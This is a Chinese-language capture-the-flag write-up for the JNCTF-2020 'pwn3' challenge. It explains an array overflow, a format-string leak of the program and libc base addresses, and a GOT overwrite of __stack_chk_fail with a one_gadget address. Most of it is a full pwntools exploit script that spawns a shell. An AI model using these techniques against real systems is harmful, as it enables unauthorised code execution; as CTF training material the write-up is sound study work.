# JNCTF-2020 : jnctf_2020_pwn3

## **【原理】**
​	1、64位bss段格式化字符串漏洞

​	2、got表劫持

​	3、onegadget

​	4、数组溢出

## **【目的】**
getshell

## **【环境】**
Ubuntu 16.04

## **【工具】**
Pwntools,ida,gdb,one_gadget

## **【步骤】**

​          先通过数组溢出实现修改加密机会次数，再通过格式化字符串漏洞泄露栈上的一些敏感地址从而获取程序的基地址和libc的基地址，再通过格式化字符串漏洞修改___stack_chk_fail got表上的内容，覆盖为onegadget的地址，最后通过一下破坏cannary的栈溢出来实现getshell。


```python

from pwn import *
from sys import *
context.update(arch='amd64',os='linux',timeout=0.5)
context.log_level='debug'
#host = argv[1]
#port = int(argv[2])
#p = remote(host,port)
p = process('./jnctf_2020_pwn3')

elf = ELF('./jnctf_2020_pwn3')
libc = ELF('./libc-2.23.so')
onegadget = [0x45226,0x4527a,0xf0364,0xf1207]

def decode1(keys,payload):
	result = ''
	key = 0	
	for i in range(len(keys)):
		key ^= ord(keys[i])
	for i in range(len(payload)):
		result += p8(ord(payload[i])^key)
	return result
def decode2(payload):
	result = ''
	for i in payload:
		result+=p8(((ord(i)&0xc0)>>2) + ((ord(i)&0x30)>>2) + ((ord(i)&0xc)>>2) +((ord(i)&0x3)<<6))
	return result
def decode3(payload):
	result = ''
	for i in payload:
		result+=p8(((ord(i)&0xc0)>>6) + ((ord(i)&0x30)<<2) + ((ord(i)&0xc)<<2) +((ord(i)&0x3)<<2))
	return result
def encode1(keys,payload):
	p.sendlineafter('choice:','1')
	p.sendafter('key?\n',keys)
	p.sendafter('encode:\n',decode1(keys,payload))
def encode2(payload):
	p.sendlineafter('choice:','2')
	p.sendafter('encode:\n',decode2(payload))
def encode3(payload):
	p.sendlineafter('choice:','3')
	p.sendafter('encode:\n',decode3(payload))
def pr(str1,addr):
	log.success(str1+'===>'+hex(addr))

encode1('aaaa','a'*0x140+p64(0x100))
encode2('%10$p-%15$p-')
p.recvuntil('after encoding...\n')
programbase = int(p.recvuntil('-')[:-1],16)-0x920
__printf = int(p.recvuntil('-')[:-1],16)-153
libcbase = __printf - libc.sym['printf']
stack_fail = elf.got['__stack_chk_fail']+programbase
one = onegadget[0] + libcbase
pr('stack_fail',stack_fail)
pr('__printf',__printf)
pr('libcbase',libcbase)
pr('programbase',programbase)
pr('one',one)

#b1 = 0xe3a+programbase
#b2 = 0xd80+programbase
#gdb.attach(p,'b *'+hex(b1))
for i in range(6):
	encode1('aaaa',p64(stack_fail+i)+'\x00')
	encode3('\x00'*8)
	encode2('%'+str((one>>(8*i))&0xff)+'c%18$hhn'+'\x00')

encode1('a'*8,'a'*0x140+p64(0x100))
encode3('a')

p.interactive()




```

## **【总结】**
需要有一定的思路